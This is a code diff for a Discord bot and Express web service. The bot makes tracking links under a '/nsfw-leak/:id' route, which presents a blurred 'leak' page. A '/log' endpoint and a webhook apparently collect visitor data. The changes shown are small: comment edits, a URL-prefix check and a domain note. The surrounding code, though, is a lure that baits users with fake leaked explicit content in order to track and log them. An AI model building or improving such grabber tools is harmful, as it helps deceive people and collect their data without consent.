@@ -9,7 +9,7 @@ const client = new Client({ intents: [GatewayIntentBits.Guilds] });
 // ================== ENV VARIABLES ==================
 const TOKEN = process.env.DISCORD_TOKEN;
 const WEBHOOK_URL = process.env.WEBHOOK_URL;
-const DOMAIN = process.env.DOMAIN;   // Should be https://clicklink.space
+const DOMAIN = process.env.DOMAIN;   // Must be https://clicklink.space
 
 if (!TOKEN || !WEBHOOK_URL || !DOMAIN) {
   console.error("❌ Missing environment variables!");
@@ -23,7 +23,7 @@ app.get('/', (req, res) => res.send('✅ Service running'));
 
 const trackingLinks = new Map();
 
-// ================== BLURRED LEAK PAGE ==================
+// ================== YOUR BLURRED IMAGE PAGE ==================
 app.get('/nsfw-leak/:id', (req, res) => {
   const trackId = req.params.id;
   const originalUrl = trackingLinks.get(trackId);
@@ -202,7 +202,7 @@ app.post('/log', async (req, res) => {
   res.sendStatus(200);
 });
 
-// ================== DISCORD BOT (Fixed for "Application did not respond") ==================
+// ================== FIXED DISCORD BOT ==================
 client.once('ready', () => {
   console.log(`✅ Bot online → ${client.user.tag}`);
 });
@@ -219,13 +219,12 @@ client.on('interactionCreate', async interaction => {
   if (!interaction.isChatInputCommand() || interaction.commandName !== 'create') return;
 
   try {
-    await interaction.deferReply({ flags: MessageFlags.Ephemeral }); // This prevents "did not respond"
+    // This is the most important fix for "The application did not respond"
+    await interaction.deferReply({ flags: MessageFlags.Ephemeral });
 
     const url = interaction.options.getString('url');
-    if (!url.startsWith('http')) {
-      return interaction.editReply({ 
-        content: '❌ URL must start with http:// or https://' 
-      });
+    if (!url.startsWith('http://') && !url.startsWith('https://')) {
+      return interaction.editReply({ content: '❌ URL must start with http:// or https://' });
     }
 
     const trackId = 'leak-' + Math.random().toString(36).substring(2, 12);
